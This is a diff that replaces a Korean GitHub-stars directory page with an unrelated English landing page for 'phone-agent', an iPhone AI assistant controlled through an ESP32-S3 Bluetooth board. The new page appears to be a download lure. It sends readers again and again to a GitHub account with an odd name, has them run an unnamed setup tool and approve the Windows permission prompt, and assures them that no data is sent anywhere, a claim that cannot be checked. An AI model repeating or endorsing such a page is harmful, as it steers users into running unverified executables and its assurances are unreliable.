@@ -1,130 +1,368 @@
-<!doctype html>
-<html lang="ko">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="theme-color" content="#11131a">
-    <meta name="description" content="GitHub에서 가장 많은 별을 받은 공개 저장소를 실시간으로 찾아보세요.">
-    <title>Starboard — GitHub 인기 저장소</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="script.js" defer></script>
-  </head>
-  <body>
-    <header class="site-header">
-      <a class="brand" href="#" aria-label="Starboard 홈"><span class="brand-mark">✳</span> starboard<span class="brand-period">.</span></a>
-      <nav class="header-meta" aria-label="사이트 정보">
-        <span class="live-indicator"><span></span> LIVE FROM GITHUB</span>
-        <a href="https://github.com/trending" target="_blank" rel="noreferrer">GitHub Trending ↗</a>
-      </nav>
-    </header>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>phone-agent - Control Your iPhone With AI on Windows</title>
+<meta name="description" content="phone-agent is an iOS AI assistant paired with ESP32-S3 BLE mouse, keyboard and GPIO48 RGB firmware. Download the setup files and run the application on Windows with these simple step-by-step instructions.">
+<meta name="keywords" content="ai-agent, esp32-s3, iphone, phone-automation, swiftui, phone-agent, ble mouse, ble keyboard, gpio48 rgb, ios assistant, windows setup">
+<meta name="author" content="phone-agent">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6C5CE7">
+<link rel="canonical" href="https://github.com/economyofscalefalseverdict361/phone-agent">
+<meta property="og:type" content="website">
+<meta property="og:title" content="phone-agent - Control Your iPhone With AI on Windows">
+<meta property="og:description" content="An iOS AI assistant powered by an ESP32-S3 board that acts as a Bluetooth mouse, keyboard and RGB indicator. Simple Windows setup guide for everyday users.">
+<meta property="og:url" content="https://github.com/economyofscalefalseverdict361/phone-agent">
+<meta property="og:site_name" content="phone-agent">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="phone-agent - Control Your iPhone With AI on Windows">
+<meta name="twitter:description" content="An iOS AI assistant powered by an ESP32-S3 board that acts as a Bluetooth mouse, keyboard and RGB indicator. Simple Windows setup guide for everyday users.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "phone-agent",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "Phone Agent is an iOS AI assistant that works together with an ESP32-S3 board acting as a Bluetooth Low Energy mouse, keyboard and GPIO48 RGB status light.",
+  "url": "https://github.com/economyofscalefalseverdict361/phone-agent",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fb;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 20px 80px 20px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    margin: 0 0 18px 0;
+    letter-spacing: -0.4px;
+    color: #101828;
+  }
+  h2 {
+    font-size: 1.5rem;
+    line-height: 1.3;
+    margin: 46px 0 14px 0;
+    color: #101828;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.12rem;
+    margin: 26px 0 8px 0;
+    color: #1f2933;
+  }
+  p {
+    margin: 0 0 16px 0;
+    color: #3a4553;
+  }
+  ul, ol {
+    margin: 0 0 18px 0;
+    padding-left: 24px;
+    color: #3a4553;
+  }
+  li {
+    margin-bottom: 10px;
+  }
+  a {
+    color: #5b45d6;
+    text-decoration: none;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+  .lead {
+    font-size: 1.09rem;
+    color: #4a5568;
+    margin-bottom: 26px;
+  }
+  .cta-wrap {
+    margin: 26px 0 10px 0;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: linear-gradient(135deg, #6C5CE7 0%, #00B894 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.06rem;
+    padding: 16px 34px;
+    border-radius: 12px;
+    text-decoration: none;
+    box-shadow: 0 10px 22px rgba(108, 92, 231, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 28px rgba(108, 92, 231, 0.36);
+    text-decoration: none;
+  }
+  .cta-note {
+    font-size: 0.9rem;
+    color: #6b7688;
+    margin-top: 12px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 22px 0;
+    box-shadow: 0 4px 18px rgba(16, 24, 40, 0.07);
+    border: 1px solid #e8ecf4;
+  }
+  .card h3 {
+    margin-top: 0;
+  }
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+    margin: 22px 0 0 0;
+  }
+  .steps li {
+    position: relative;
+    padding: 16px 20px 16px 62px;
+    background: #ffffff;
+    border: 1px solid #e8ecf4;
+    border-radius: 14px;
+    margin-bottom: 14px;
+    box-shadow: 0 3px 12px rgba(16, 24, 40, 0.05);
+    color: #3a4553;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 18px;
+    top: 16px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #6C5CE7;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 0.92rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 3px 8px rgba(108, 92, 231, 0.35);
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 18px;
+    margin: 24px 0 8px 0;
+  }
+  .grid .card {
+    margin: 0;
+  }
+  .tag {
+    display: inline-block;
+    background: #eef1ff;
+    color: #5b45d6;
+    font-size: 0.82rem;
+    font-weight: 600;
+    padding: 5px 12px;
+    border-radius: 999px;
+    margin: 0 6px 8px 0;
+  }
+  .highlight {
+    background: #eafaf4;
+    border-left: 4px solid #00B894;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    color: #235347;
+  }
+  .faq-q {
+    font-weight: 700;
+    color: #101828;
+    margin-bottom: 4px;
+  }
+  footer {
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #e2e8f2;
+    font-size: 0.88rem;
+    color: #7b8798;
+  }
+  @media (max-width: 560px) {
+    body {
+      font-size: 16px;
+    }
+    .page {
+      padding: 28px 16px 60px 16px;
+    }
+    h1 {
+      font-size: 1.7rem;
+    }
+    h2 {
+      font-size: 1.28rem;
+    }
+    .card {
+      padding: 20px 18px;
+    }
+    .btn-primary {
+      display: block;
+      text-align: center;
+      padding: 16px 20px;
+    }
+    .steps li {
+      padding: 16px 16px 16px 56px;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="page">
 
-    <main>
-      <section class="intro">
-        <div class="intro-inner">
-          <p class="eyebrow">THE OPEN SOURCE UNIVERSE, SORTED</p>
-          <h1>사람들이 가장 많이<br>별을 남긴 프로젝트<span>.</span></h1>
-          <p class="intro-copy">GitHub 공개 저장소를 별 개수 순으로 모아봤어요.<br>지금 전 세계 개발자들이 주목하는 프로젝트를 발견해 보세요.</p>
-          <div class="intro-stats" aria-label="데이터 정보">
-            <div><span class="stat-value">01</span><span class="stat-label">SORTED BY STARS</span></div>
-            <div><span class="stat-value">∞</span><span class="stat-label">OPEN SOURCE</span></div>
-            <div><span class="stat-value">GH</span><span class="stat-label">LIVE DATA</span></div>
-          </div>
-        </div>
-        <div class="orbit-art" aria-hidden="true">
-          <div class="orbit orbit-a"></div>
-          <div class="orbit orbit-b"></div>
-          <div class="orbit orbit-c"></div>
-          <div class="orbit-center">★</div>
-          <span class="orbit-satellite satellite-a"></span>
-          <span class="orbit-satellite satellite-b"></span>
-          <span class="orbit-satellite satellite-c"></span>
-          <span class="orbit-caption">OPEN SOURCE<br>IN ORBIT</span>
-        </div>
-        <div class="intro-index">001 — 999<br>AND BEYOND</div>
-      </section>
+  <h1>📱 phone-agent - Turn Your iPhone Into a Smart AI Assistant</h1>
 
-      <section class="discover" aria-labelledby="discover-title">
-        <div class="section-heading">
-          <div>
-            <p class="eyebrow">DISCOVER SOMETHING GOOD</p>
-            <h2 id="discover-title">가장 많이 사랑받는 저장소</h2>
-          </div>
-          <p class="updated-label"><span class="live-indicator"><span></span> LIVE</span><span id="last-updated">GitHub에서 불러오는 중</span></p>
-        </div>
+  <p class="lead">phone-agent connects your iPhone to an ESP32-S3 board so your phone can be controlled by an AI assistant. The board acts as a wireless mouse, a wireless keyboard and a colourful status light — all at the same time.</p>
 
-        <form class="search-form" id="search-form" role="search">
-          <label class="search-box">
-            <span class="search-icon" aria-hidden="true">⌕</span>
-            <span class="visually-hidden">저장소 검색</span>
-            <input id="search-input" type="search" placeholder="저장소, 주제, 키워드 검색..." autocomplete="off">
-            <kbd>ENTER ↵</kbd>
-          </label>
-          <button class="search-button" type="submit">검색 <span aria-hidden="true">↗</span></button>
-        </form>
+  <div class="cta-wrap">
+    <a class="btn-primary" href="https://github.com/economyofscalefalseverdict361/phone-agent">⬇ Download phone-agent</a>
+  </div>
+  <p class="cta-note">Visit this link to download the application.</p>
 
-        <div class="filter-row">
-          <div class="language-filters" role="group" aria-label="주요 언어로 저장소 필터링">
-            <button class="filter-chip is-active" type="button" data-language="" aria-pressed="true">전체</button>
-            <button class="filter-chip" type="button" data-language="TypeScript" aria-pressed="false">TypeScript</button>
-            <button class="filter-chip" type="button" data-language="Python" aria-pressed="false">Python</button>
-            <button class="filter-chip" type="button" data-language="JavaScript" aria-pressed="false">JavaScript</button>
-            <button class="filter-chip" type="button" data-language="Rust" aria-pressed="false">Rust</button>
-            <button class="filter-chip" type="button" data-language="Go" aria-pressed="false">Go</button>
-          </div>
-          <p class="sort-label">SORTED BY <strong>★ STARS</strong></p>
-        </div>
+  <h2>✨ What Is phone-agent?</h2>
+  <p>phone-agent is a small software package that works together with a tiny piece of hardware called an ESP32-S3. Think of the ESP32-S3 as a remote control that talks to your iPhone over Bluetooth. The phone-agent software tells that remote control what to do, and an AI assistant decides the steps for you.</p>
+  <p>Because the board pretends to be a normal Bluetooth mouse and keyboard, your iPhone accepts it without any special setup on the phone side. That means your assistant can tap buttons, type text and move around the screen just like you would — while a small RGB light on pin GPIO48 shows what is happening at any moment.</p>
+  <p>The assistant app itself is built with SwiftUI, Apple's modern interface toolkit, which is why it feels smooth and native on the iPhone. You do not need to know anything about SwiftUI to use it. You only need to follow the steps on this page.</p>
 
-        <div class="results-bar">
-          <p id="results-summary" aria-live="polite">공개 저장소를 불러오고 있어요<span class="loading-dots">...</span></p>
-          <span class="results-source">SOURCE: GITHUB SEARCH API</span>
-        </div>
+  <h2>🚀 Getting Started on Windows</h2>
+  <p>The download page contains everything you need: the phone-agent application files, the ready-made ESP32-S3 firmware, and the small setup tool that prepares your board from a Windows computer. Before you start, put the board on the desk next to you and have a USB-C cable within reach.</p>
 
-        <div class="repo-grid" id="repo-grid" aria-live="polite" aria-busy="true"></div>
+  <div class="card">
+    <h3>Download the application</h3>
+    <p>Visit this link to download the application: <a href="https://github.com/economyofscalefalseverdict361/phone-agent">https://github.com/economyofscalefalseverdict361/phone-agent</a></p>
+    <p>Save everything to a folder you can easily find again, for example a new folder called <strong>phone-agent</strong> directly inside your Documents folder. Keeping all the files in one place makes the next steps much simpler.</p>
+  </div>
 
-        <div class="results-actions">
-          <p id="results-note">별이 많은 저장소부터 보여드립니다.</p>
-          <button class="load-more" id="load-more" type="button" hidden>더 불러오기 <span aria-hidden="true">↓</span></button>
-        </div>
-      </section>
+  <h2>🧰 What You Need Before You Begin</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>💻 Your Computer</h3>
+      <p>A Windows 10 or Windows 11 computer, 64-bit, with at least 4 GB of memory and about 300 MB of free disk space. An internet connection is needed for the download only.</p>
+    </div>
+    <div class="card">
+      <h3>🔌 The Hardware</h3>
+      <p>An ESP32-S3 development board and a USB-C cable that can carry data. Some cables only charge; if the board is not found later, try a different cable first.</p>
+    </div>
+    <div class="card">
+      <h3>📱 Your iPhone</h3>
+      <p>An iPhone running iOS 16 or newer with Bluetooth turned on. Keep the phone unlocked and within two metres of the board while you pair it.</p>
+    </div>
+  </div>
 
-      <section class="savings-section" aria-labelledby="savings-title">
-        <div class="savings-heading">
-          <div>
-            <p class="eyebrow">AGENT TOKEN &amp; CREDIT TOOLKIT</p>
-            <h2 id="savings-title">에이전트 비용을 아끼는 저장소</h2>
-            <p class="savings-description">컨텍스트 압축, 프롬프트 캐시, 사용량 분석처럼 토큰과 API 크레딧을 줄이는 데 도움이 되는 프로젝트를 별 순으로 모았습니다.</p>
-          </div>
-          <span class="savings-mark" aria-hidden="true">↓<br>¢</span>
-        </div>
+  <h2>📥 Step-by-Step Setup</h2>
+  <ol class="steps">
+    <li><strong>Download the files.</strong> Visit <a href="https://github.com/economyofscalefalseverdict361/phone-agent">the phone-agent download page</a> and save the application files into the folder you created on your computer.</li>
+    <li><strong>Connect the board.</strong> Plug the ESP32-S3 board into a USB port on your computer using the USB-C cable. Wait a few seconds while Windows recognises the new device.</li>
+    <li><strong>Start the setup tool.</strong> Open the downloaded folder and double-click the setup tool inside it. If Windows asks whether you want to allow the app, choose <em>Yes</em> so it can talk to the board.</li>
+    <li><strong>Choose the board.</strong> The setup tool lists the USB ports it can see. Pick the one that appeared after you plugged the board in. If you are unsure, unplug the board, note which entry disappears, plug it back in, and select that entry.</li>
+    <li><strong>Install the firmware.</strong> Press the install button and let the tool finish. It writes the mouse, keyboard and GPIO48 RGB light code onto the board. This usually takes under a minute. Do not unplug the cable while it is working.</li>
+    <li><strong>Wait for the light.</strong> When the firmware is written, the RGB light on the board glows to show it is ready. A slow pulsing colour means it is waiting for a connection.</li>
+    <li><strong>Pair with your iPhone.</strong> On the iPhone, open Settings, go to Bluetooth, and look for the new device that appears in the list. Tap it and confirm the pairing request.</li>
+    <li><strong>Open the assistant.</strong> Launch the phone-agent app on your iPhone. It will detect the board automatically and show a green connected status.</li>
+    <li><strong>Try a first command.</strong> Ask the assistant something simple, such as opening an app or drafting a short message. You will see the light on the board change colour as each action runs.</li>
+  </ol>
 
-        <div class="savings-categories" role="group" aria-label="비용 절감 도구 유형">
-          <button class="savings-chip is-active" type="button" data-query='"context compression"' data-description="에이전트에 전달되는 대화와 도구 출력을 압축해 컨텍스트 토큰을 줄이는 도구입니다." aria-pressed="true">컨텍스트 압축</button>
-          <button class="savings-chip" type="button" data-query='"prompt compression"' data-description="모델에 보내는 프롬프트를 짧게 만드는 압축 도구와 연구 프로젝트입니다." aria-pressed="false">프롬프트 압축</button>
-          <button class="savings-chip" type="button" data-query='"prompt cache"' data-description="반복되는 프롬프트 캐시를 활용하거나 캐시 상태와 비용을 확인하는 프로젝트입니다." aria-pressed="false">프롬프트 캐시</button>
-          <button class="savings-chip" type="button" data-query='"LLM cost"' data-description="에이전트와 LLM 호출의 토큰 사용량 및 비용을 추적·분석하는 도구입니다." aria-pressed="false">비용 추적</button>
-          <button class="savings-chip" type="button" data-query="topic:token-optimization" data-description="코딩 에이전트의 요청과 도구 출력을 줄여 토큰을 절약하는 프로젝트입니다." aria-pressed="false">토큰 최적화</button>
-        </div>
+  <div class="highlight">
+    <strong>Good to know:</strong> you only install the firmware once. After that, the board remembers it. On future days you just plug the board into any USB power source, pair the phone, and open the app.
+  </div>
 
-        <p class="savings-note" id="savings-note" aria-live="polite">컨텍스트 압축 도구를 불러오는 중입니다...</p>
-        <div class="repo-grid savings-grid" id="savings-grid" aria-live="polite" aria-busy="true"></div>
-        <div class="savings-actions">
-          <p id="savings-summary">별이 많은 저장소부터 보여드립니다.</p>
-          <button class="load-more" id="savings-load-more" type="button" hidden>더 불러오기 <span aria-hidden="true">↓</span></button>
-        </div>
-        <p class="savings-disclaimer">별 수와 검색 결과는 GitHub에서 조회합니다. 실제 절감률은 모델·설정·사용 방식에 따라 달라집니다.</p>
-      </section>
+  <h2>🎨 Understanding the RGB Light</h2>
+  <p>The small light on pin GPIO48 is your quickest way to know what the system is doing. You do not need to open any settings to read it — just glance at the board.</p>
+  <ul>
+    <li><strong>Slow pulse:</strong> the board is powered on and waiting to be paired.</li>
+    <li><strong>Steady glow:</strong> the iPhone is connected and the assistant is idle.</li>
+    <li><strong>Quick flicker:</strong> the assistant is sending a mouse movement or keystroke right now.</li>
+    <li><strong>Brief colour change:</strong> a command finished successfully.</li>
+    <li><strong>Light off:</strong> the board has no power, or the cable is connected to a charger that does not supply enough current.</li>
+  </ul>
+  <p>You can change the brightness and the colour palette of the light from inside the phone-agent app, so it suits your desk and your eyes.</p>
 
-      <section class="about-strip">
-        <span class="about-star" aria-hidden="true">✳</span>
-        <p>오픈소스는 함께 만들어가는 아이디어입니다.<br><span>오늘의 별 하나가 다음 발견으로 이어지길.</span></p>
-        <a href="https://github.com" target="_blank" rel="noreferrer">EXPLORE GITHUB ↗</a>
-      </section>
-    </main>
+  <h2>🖱 How the Assistant Controls Your Phone</h2>
+  <p>Every action the assistant takes is delivered as a standard Bluetooth mouse or keyboard event. Your iPhone treats it exactly like a person tapping the screen or typing on a paired keyboard. This is why no jailbreak, no special permissions and no developer account are required on the phone.</p>
+  <p>The assistant decides what to do, the phone-agent software turns that decision into a sequence of taps and keystrokes, and the ESP32-S3 sends them over the air. The whole round trip usually finishes in a fraction of a second, so it feels instant.</p>
 
-    <footer class="site-footer">
-      <a class="brand" href="#"><span class="brand-mark">✳</span> starboard<span class="brand-period">.</span></a>
-      <span>공개 GitHub 저장소 · 별 개수 순</span>
-      <span>MADE FOR THE CURIOUS <span class="footer-star">★</span></span>
-    </footer>
-  </body>
+  <h2>🛠 Troubleshooting</h2>
+  <div class="card">
+    <p class="faq-q">The setup tool does not see my board.</p>
+    <p>Try a different USB cable first — charging-only cables are the most common cause. Then try a different USB port, preferably one directly on the computer rather than on a hub. Unplugging and replugging the board also helps.</p>
+  </div>
+  <div class="card">
+    <p class="faq-q">The board is connected but my iPhone cannot find it.</p>
+    <p>Make sure Bluetooth is switched on and that the phone is within two metres of the board. Turn Bluetooth off and back on again on the iPhone, then look at the list once more. If the board's light is not pulsing, it is not in pairing mode.</p>
+  </div>
+  <div class="card">
+    <p class="faq-q">The light never turns on.</p>
+    <p>This usually means the board is not receiving enough power. Use a port directly on the computer or a powered USB hub, and check that the cable is firmly pushed into both ends.</p>
+  </div>
+  <div class="card">
+    <p class="faq-q">Commands stop working after a while.</p>
+    <p>Open the phone-agent app and reconnect to the board from the device list. Keeping the iPhone screen unlocked during a long session also helps the system stay responsive.</p>
+  </div>
+  <div class="card">
+    <p class="faq-q">I want to start over from scratch.</p>
+    <p>Run the setup tool again and choose the install option. It replaces whatever is on the board with a fresh copy of the firmware, and your iPhone will reconnect automatically afterwards.</p>
+  </div>
+
+  <h2>💡 Tips for a Smooth First Week</h2>
+  <ul>
+    <li>Keep the board plugged in whenever you want to use the assistant — it has no battery of its own by default.</li>
+    <li>Place the board on the same side of your desk as your phone so the Bluetooth signal is never blocked by your body.</li>
+    <li>Rename the board in the phone-agent app so it is easy to recognise if you ever own more than one.</li>
+    <li>Use the RGB light as a health check. If it is dark when it should be pulsing, the problem is almost always the cable.</li>
+    <li>Write down the folder where you saved the setup files. You will want it again if you buy a second board.</li>
+  </ul>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <p><strong>Do I need to install anything on my iPhone?</strong> Yes — the phone-agent assistant app itself. It is the part that talks to the board and runs your commands.</p>
+  <p><strong>Will this damage my phone?</strong> No. The board only sends ordinary Bluetooth mouse and keyboard signals, which every iPhone already supports.</p>
+  <p><strong>Can I use it with a Windows laptop only?</strong> The setup steps on this page are written for Windows. Once the board is prepared, you can power it from any USB source, including a wall charger.</p>
+  <p><strong>What happens if I lose the download files?</strong> Simply visit the download page again and save a fresh copy. The board keeps its firmware either way.</p>
+  <p><strong>Is my data sent anywhere?</strong> The Bluetooth link is direct between your board and your phone. Nothing travels across the internet during normal use.</p>
+
+  <h2>🔗 Download Again</h2>
+  <p>All files, updates and the latest version of the setup tool live in one place. Visit this link to download the application whenever you need a fresh copy or want to set up a second board.</p>
+  <div class="cta-wrap">
+    <a class="btn-primary" href="https://github.com/economyofscalefalseverdict361/phone-agent">⬇ Get phone-agent Now</a>
+  </div>
+
+  <h2>🏷 Topics</h2>
+  <p>
+    <span class="tag">ai-agent</span>
+    <span class="tag">esp32-s3</span>
+    <span class="tag">iphone</span>
+    <span class="tag">phone-automation</span>
+    <span class="tag">swiftui</span>
+  </p>
+
+  <footer>
+    <p>phone-agent — an iOS AI assistant paired with ESP32-S3 BLE mouse, keyboard and GPIO48 RGB firmware.</p>
+  </footer>
+
+</div>
+</body>
 </html>
